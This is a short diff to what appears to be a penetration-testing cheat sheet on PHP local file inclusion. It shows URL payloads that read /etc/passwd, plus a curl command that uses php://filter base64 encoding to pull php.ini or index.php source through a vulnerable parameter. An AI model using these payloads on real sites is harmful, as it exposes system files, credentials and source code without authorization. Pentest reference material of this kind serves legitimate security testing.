@@ -71,8 +71,13 @@ http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 
 **Grab PHP files and Binary Data**
 
-Obtain Base64 Data | <code> http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini <br> http://website/?p=php://filter/convert.base64-encode/resource=index.php </code>
-Decode base64 data | <code> curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d </code>
+{% highlight bash %}
+curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=[resource]" | base64 -d
+{% endhighlight %}
+
+Examples:
+/etc/php/7.0/apache2/php.ini
+index.php
 
 
 **Auto-Extension (.php) Bypass:**
